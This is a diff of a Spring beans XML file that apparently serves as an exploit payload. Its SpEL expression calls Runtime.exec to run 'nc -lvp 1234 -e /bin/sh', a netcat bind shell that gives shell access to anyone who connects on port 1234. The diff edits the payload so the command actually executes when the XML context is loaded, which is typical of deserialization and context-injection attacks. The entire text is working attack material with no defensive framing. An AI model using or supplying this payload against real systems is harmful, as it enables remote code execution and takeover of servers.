@@ -5,7 +5,6 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.Runtime">
-     <constructor-arg value="nc -lvp 1234 -e /bin/sh"/>
-     <property name="whatever" value="#{ pb.getRuntime().exec() }"/>
+     <property name="whatever" value="#{ pb.getRuntime().exec('nc -lvp 1234 -e /bin/sh') }"/>
   </bean>
 </beans>
